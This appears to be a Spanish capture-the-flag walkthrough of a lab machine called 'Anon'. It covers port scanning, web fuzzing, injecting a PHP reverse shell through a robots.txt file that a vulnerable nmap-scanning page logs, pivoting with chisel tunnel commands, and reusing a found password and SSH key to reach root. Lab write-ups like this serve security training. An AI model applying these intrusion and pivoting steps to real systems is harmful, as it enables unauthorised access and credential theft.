# Máquina Anon
### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.176

![alt text](image-1.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80,873 -vvv -Pn 192.168.5.176

![alt text](image-2.png)


### Fuzzing Web

dirsearch -u http://192.168.5.176/ -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

![alt text](image-3.png)

Entramos en la web: http://192.168.5.176/Anonymous-Connections/

![alt text](image-4.png)

Me pide que ingrese una ip, ingreso la ip de mi kali linux

![alt text](image-5.png)

me dió como resultado fue un escaneo de nmap:

![alt text](image-6.png)

abri el log en el directorio /victims

![alt text](image-7.png)

Creé un archivo robots y levanté un servidor web con python

![alt text](image-8.png)

y volví a realizar el escaneo y abrí el log:

![alt text](image-9.png)


Probé cambiando el Disallow por un código php:

![alt text](image-10.png)

volví a escanear:

![alt text](image-11.png)

subí el log a victims:

![alt text](image-12.png)

### Explotación

En el archivo robots.txt en la parte de Disallow coloqué un reverse shell en php y volví a escanear:

![alt text](image-13.png)

![alt text](image-14.png)

me puse en escucha con netcat por el puerto 443

subi el log a victims:

![alt text](image-15.png)

![alt text](image-16.png)

A primera vista verifiqué que no estaba en la máquina objetivo en sí, por lo tanto debía hacer movimiento lateral:

![alt text](image-17.png)

verifiqué los usuarios:

![alt text](image-18.png)

![alt text](image-19.png)

en /root encuentro una contraseña:

![alt text](image-20.png)

verifico la ip:

![alt text](image-21.png)

como realiza escaneo de puertos, realizo uno, para ver posibles ip's

![alt text](image-22.png)

ahora verifico sus puertos abiertos de la ip 10.10.10.20

nmap -sVC -vvv 10.10.10.20

![alt text](image-23.png)

Utilizando chisel:

en kali:

./chisel server -p 1234 --reverse

en víctima:
./chisel client 192.168.5.131:1234 R:2222:10.10.10.20:2222

me conecté por ssh con el usuario root y la contraseña anteriormente encontrada:
ssh root@192.168.5.131 -p 2222

![alt text](image-24.png)

en /root encontré un id_rsa lo copié y guardé en mí kali

usando la herramienta RsaUserReveal.sh de MatthyGD

![alt text](image-25.png)

Encontré al usuario

![alt text](image-26.png)

y me conecté por ssh

![alt text](image-30.png)

### Escalar privilegios

![alt text](image-27.png)

### user.txt

![alt text](image-29.png)

### root.txt

![alt text](image-28.png)